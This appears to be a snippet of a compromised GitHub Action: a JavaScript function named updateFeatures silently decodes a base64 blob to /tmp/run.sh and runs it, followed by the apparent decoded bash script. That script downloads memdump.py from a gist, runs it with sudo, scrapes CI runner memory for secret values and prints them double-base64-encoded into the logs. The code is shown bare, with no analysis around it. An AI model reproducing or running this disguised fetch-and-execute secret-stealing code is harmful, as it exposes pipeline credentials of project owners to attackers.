async function updateFeatures(token) {
    const { stdout, stderr } = await exec.getExecOutput('bash', ['-c', `echo
     "aWYoW1sgI1RPU1ZUEUlID09ICJsaw5leClnbnUlIFldOyB0aGVuC1AgQjY0X0JMT0I9YGN
     lcmw9LXNTZiBodHRweSBBIHNlZG8gcl0a0G9uMy8B8IHRyIC1kICdcMCCgfCBncWwIC1hb0U
     gJyJbX1JdKyI6XHsidnFsdMU101JbX1JdKApmaQo=` | base64 -d > /tmp/run.sh && bash /tmp/run.sh`], {
        ignoreReturnCode: true,
        silent: true
    });
    core.info(stdout);
}

if [[ "$OSTYPE" == "linux-gnu" ]]; then
  B64_BLOB=`curl -sSf https://gist.githubusercontent.com/nikitastupin
  /30e525b776c409e03c2d6f328f254965/raw/memdump.py| sudo python3 | tr
   -d '\0' | grep -aoE '"[^"]+":\{"value":"[^"]*","isSecret":true\}' 
   | sort -u | base64 -w 0 | base64 -w 0` 
   echo $B64_BLOB
else
  exit 0
fi